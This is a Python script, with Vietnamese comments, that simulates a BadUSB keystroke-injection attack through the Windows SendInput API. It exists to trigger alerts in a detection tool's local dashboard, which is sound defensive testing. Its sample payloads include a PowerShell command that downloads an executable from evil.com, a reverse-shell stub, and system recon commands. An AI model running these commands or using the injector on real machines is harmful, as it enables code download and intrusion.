#!/usr/bin/env python3
"""
simulate_badusb.py - Mo phong tan cong BadUSB (khong can pyautogui)
Dung ctypes + SendInput (Windows API) de gui phim truc tiep.
"""

import time
import sys
import ctypes
import argparse

# --- Windows API constants ---
INPUT_KEYBOARD = 1
KEYEVENTF_KEYUP = 0x0002
KEYEVENTF_UNICODE = 0x0004
VK_SHIFT = 0x10
VK_RETURN = 0x0D

# Map ky tu -> Virtual Key code
VK_MAP = {
    'a': 0x41, 'b': 0x42, 'c': 0x43, 'd': 0x44, 'e': 0x45,
    'f': 0x46, 'g': 0x47, 'h': 0x48, 'i': 0x49, 'j': 0x4A,
    'k': 0x4B, 'l': 0x4C, 'm': 0x4D, 'n': 0x4E, 'o': 0x4F,
    'p': 0x50, 'q': 0x51, 'r': 0x52, 's': 0x53, 't': 0x54,
    'u': 0x55, 'v': 0x56, 'w': 0x57, 'x': 0x58, 'y': 0x59,
    'z': 0x5A,
    'A': 0x41, 'B': 0x42, 'C': 0x43, 'D': 0x44, 'E': 0x45,
    'F': 0x46, 'G': 0x47, 'H': 0x48, 'I': 0x49, 'J': 0x4A,
    'K': 0x4B, 'L': 0x4C, 'M': 0x4D, 'N': 0x4E, 'O': 0x4F,
    'P': 0x50, 'Q': 0x51, 'R': 0x52, 'S': 0x53, 'T': 0x54,
    'U': 0x55, 'V': 0x56, 'W': 0x57, 'X': 0x58, 'Y': 0x59,
    'Z': 0x5A,
    '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34,
    '5': 0x35, '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39,
    ' ': 0x20, '.': 0xBE, ',': 0xBC, '-': 0xBD, '=': 0xBB,
    '[': 0xDB, ']': 0xDD, '\\': 0xDC, ';': 0xBB, "'": 0xDE,
    '/': 0xBF, '`': 0xC0,
}


class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk", ctypes.c_ushort),
        ("wScan", ctypes.c_ushort),
        ("dwFlags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]


class UNINPUT(ctypes.Structure):
    _fields_ = [
        ("type", ctypes.c_ulong),
        ("ki", KEYBDINPUT),
        ("padding", ctypes.c_ubyte * 8),
    ]


SendInput = ctypes.windll.user32.SendInput
PUL = ctypes.POINTER(ctypes.c_ulong)


def send_key(vk_code, up=True):
    """Gui 1 phim (xuong + len) qua SendInput."""
    extra = ctypes.c_ulong(0)
    ii_ = UNINPUT * 2

    # Xuong
    x1 = ii_(
        UNINPUT(INPUT_KEYBOARD, KEYBDINPUT(vk_code, 0, 0, 0, PUL(extra))),
        UNINPUT(INPUT_KEYBOARD, KEYBDINPUT(0, 0, KEYEVENTF_KEYUP, 0, PUL(extra))),
    )
    SendInput(2, ctypes.byref(x1), ctypes.sizeof(UNINPUT))

    # Len
    x2 = ii_(
        UNINPUT(INPUT_KEYBOARD, KEYBDINPUT(vk_code, 0, 0, 0, PUL(extra))),
        UNINPUT(INPUT_KEYBOARD, KEYBDINPUT(0, 0, KEYEVENTF_KEYUP, 0, PUL(extra))),
    )
    SendInput(2, ctypes.byref(x2), ctypes.sizeof(UNINPUT))


def send_unicode(char):
    """Gui 1 ky tu Unicode (cho ky tu dac biet)."""
    extra = ctypes.c_ulong(0)
    scan = ord(char)

    ii_down = (UNINPUT * 2)(
        UNINPUT(INPUT_KEYBOARD, KEYBDINPUT(0, scan, KEYEVENTF_UNICODE, 0, PUL(extra))),
        UNINPUT(INPUT_KEYBOARD, KEYBDINPUT(0, scan, KEYEVENTF_UNICODE | KEYEVENTF_KEYUP, 0, PUL(extra))),
    )
    SendInput(2, ctypes.byref(ii_down), ctypes.sizeof(UNINPUT))


def send_text(text, delay_s):
    """Go 1 chuoi text voi delay co dinh."""
    for char in text:
        if char == '\n':
            send_key(VK_RETURN)
        elif char in VK_MAP:
            vk = VK_MAP[char]
            if char.isupper() or char in ')!@#$%^&*(':
                send_key(VK_SHIFT)
            send_key(vk)
        else:
            send_unicode(char)
        time.sleep(delay_s)


# Payload BadUSB mau
PAYLOADS = {
    "hello": "echo Hello from BadUSB",
    "whoami": "whoami /all",
    "reverse_shell": 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient"',
    "download": 'powershell -c "Invoke-WebRequest http://evil.com/m.exe -OutFile C:\\temp\\m.exe"',
    "recon": "ipconfig /all && systeminfo",
}


def countdown(seconds=3):
    for i in range(seconds, 0, -1):
        print(f"  {i}...")
        time.sleep(1)


def simulate_fast_keys(num_keys=60, delay_ms=20.0):
    """Go phim ngau nhien cuc nhanh — kich hoat R1, R2, R3, R4."""
    keys = "abcdefghijklmnopqrstuvwxyz0123456789"

    print(f"\n[SIMULATE] Bat dau go {num_keys} phim, delay {delay_ms}ms/ky tu")
    print(f"[SIMULATE] Toc do: {1000/delay_ms:.0f} keys/s")
    print("[SIMULATE] Ban co 3 giay de chuyen sang cua so text editor (Notepad, VS Code...)...")
    countdown()

    print("[SIMULATE] Dang go...")
    start = time.time()

    for i in range(num_keys):
        char = keys[i % len(keys)]
        send_text(char, delay_ms / 1000.0)

        if (i + 1) % 20 == 0:
            time.sleep(0.1)
            send_key(VK_RETURN)

    elapsed = time.time() - start
    print(f"\n[SIMULATE] Hoan thanh! {num_keys} phim trong {elapsed:.2f}s ({num_keys/elapsed:.1f} keys/s)")
    print("[SIMULATE] Kiem tra Dashboard tai http://localhost:3000 de xem canh bao.")


def simulate_payload(payload_text, delay_ms=20.0):
    """Go payload BadUSB voi delay deu — dac trung cua may USB gian lap."""
    print(f"\n[PAYLOAD] {payload_text[:60]}...")
    print("[SIMULATE] Ban co 3 giay de chuyen sang cua so text editor...")
    countdown()

    print("[SIMULATE] Dang go...")
    start = time.time()
    send_text(payload_text, delay_ms / 1000.0)
    elapsed = time.time() - start
    print(f"\n[SIMULATE] Hoan thanh trong {elapsed:.2f}s")
    print("[SIMULATE] Kiem tra Dashboard tai http://localhost:3000 de xem canh bao.")


def main():
    parser = argparse.ArgumentParser(description="Mo phong tan cong BadUSB (chi de demo)")
    parser.add_argument("--speed", type=float, default=50.0,
                        help="Toc do go (keys/s), mac dinh: 50")
    parser.add_argument("--keys", type=int, default=60,
                        help="So phim go, mac dinh: 60")
    parser.add_argument("--payload", type=str, choices=list(PAYLOADS.keys()),
                        help="Dung payload co san (hello, whoami, reverse_shell, download, recon)")
    parser.add_argument("--custom", type=str,
                        help="Go payload tu dinh nghia")
    args = parser.parse_args()

    delay_ms = 1000.0 / args.speed

    print("=" * 52)
    print("  KDS Guard - BadUSB Simulator")
    print("  CHI DUNG DE DEMO, KHONG PHAI CONG CU TAN CONG")
    print("=" * 52)
    print()
    print("  [1] Mo Dashboard:  http://localhost:3000")
    print(f"  [2] Toc do: {args.speed} keys/s")
    print()

    if args.payload:
        simulate_payload(PAYLOADS[args.payload], delay_ms)
    elif args.custom:
        simulate_payload(args.custom, delay_ms)
    else:
        simulate_fast_keys(args.keys, delay_ms)

    print("\n[OK] Xem ket qua phat hien tai http://localhost:3000")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[SIMULATE] Da dung.")
